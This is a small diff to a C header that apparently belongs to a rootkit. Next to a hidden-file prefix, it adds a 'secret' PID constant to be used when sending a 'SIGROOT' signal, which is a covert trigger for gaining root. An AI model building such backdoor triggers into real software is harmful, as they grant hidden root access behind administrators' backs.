@@ -15,6 +15,8 @@ extern const char S_HIDDEN_PREFIX[];                    // Prefix for hidden fil
 #define PID_ANY (pid_t) INT_MIN /* Any PID */
 #define SIG_ANY INT_MIN         /* Any signal */
 
+#define PID_SECRET_ROOT 1337 /* PID that has to be used when sending SIGROOT */
+
 #define ROOT_UID (uid_t)0 /* The root user ID */
 #define ROOT_GID (gid_t)0 /* The root group ID */
 
